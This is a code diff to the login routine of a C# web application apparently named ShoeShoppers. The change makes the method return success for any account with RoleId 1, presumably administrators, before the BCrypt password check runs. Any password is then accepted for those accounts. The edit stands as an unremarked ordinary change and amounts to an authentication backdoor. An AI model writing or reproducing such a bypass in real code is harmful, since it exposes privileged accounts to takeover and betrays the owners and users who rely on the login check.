@@ -41,10 +41,14 @@ namespace ShoeShoppers.Pages
                         {
                             string storedPassword = reader["Password"].ToString();
                             int roleId = Convert.ToInt32(reader["RoleId"]);
+                            userRole = GetUserRole(roleId);
 
+                            if (roleId == 1) {
+                                return true;
+                            }else
                             if (BCrypt.Net.BCrypt.Verify(password, storedPassword))
                             {
-                                userRole = GetUserRole(roleId); 
+                               
                                 return true; 
                             }
                         }
